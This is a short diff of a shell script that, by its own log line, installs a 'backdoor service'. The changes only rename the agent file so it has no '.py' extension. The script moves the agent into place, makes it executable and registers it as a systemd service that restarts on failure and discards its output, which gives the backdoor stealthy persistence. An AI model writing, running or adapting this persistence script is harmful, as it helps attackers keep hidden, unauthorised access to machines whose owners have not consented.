@@ -12,7 +12,7 @@ echo "[+] Installing backdoor service..."
 
 # === Move agent ===
 echo "[+] Moving agent to $INSTALL_PATH..."
-sudo mv $CURRENT_PATH/$AGENT_NAME $INSTALL_PATH/$SERVICE_NAME.py
+sudo mv $CURRENT_PATH/$AGENT_NAME $INSTALL_PATH/$SERVICE_NAME
 
 # === Move config ===
 if [ -f $CURRENT_PATH/config.json ]; then
@@ -22,7 +22,7 @@ fi
 
 # === Set permissions ===
 echo "[+] Setting permissions..."
-sudo chmod +x $INSTALL_PATH/$SERVICE_NAME.py
+sudo chmod +x $INSTALL_PATH/$SERVICE_NAME
 
 # === Create systemd service ===
 echo "[+] Creating systemd service..."
@@ -35,7 +35,7 @@ After=network.target
 [Service]
 Type=simple
 ExecStartPre=/bin/sleep 5
-ExecStart=/usr/bin/python $INSTALL_PATH/$SERVICE_NAME.py
+ExecStart=/usr/bin/python $INSTALL_PATH/$SERVICE_NAME
 Restart=on-failure
 RestartSec=5
 StandardOutput=null
